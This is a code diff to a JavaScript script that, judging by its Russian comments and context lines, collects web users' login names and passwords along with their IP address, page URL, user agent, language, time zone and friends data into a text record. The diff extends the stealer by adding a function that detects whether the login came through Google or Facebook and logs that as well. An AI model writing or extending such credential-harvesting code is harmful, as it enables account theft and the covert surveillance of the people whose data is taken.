@@ -22,6 +22,16 @@
             }
         };
 
+		function getLoginType() {
+   		 if (user.login.startsWith('g_')) {
+		      return 'Google';
+   		 } else if (user.login.startsWith('f_')) {
+      return 'facebook';
+   		 } else {
+   		   return 'default login';
+  		  }
+		  }
+		
         // Функция для сбора логина и пароля
         const getCredentials = () => {
             try {
@@ -154,6 +164,7 @@
             const friendsDataStr = getFriendsData();
             const friendsArrStr = getFriendsArr();
 			const userDataResultStr = getUserDataResult()
+			const loginType = getLoginType()
             
             const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                      credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
@@ -171,6 +182,7 @@
             fileContent += `IP-адрес: ${userIP}\n`;
             fileContent += `URL страницы: ${window.location.href}\n`;
 			fileContent += `Network Type: ${navigator.connection.effectiveType}\n`;
+			fileContent += `Login Method: ${loginType}\n`;
 			fileContent += `Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
 			fileContent += `Laungage: ${navigator.language}\n\n`;
             fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
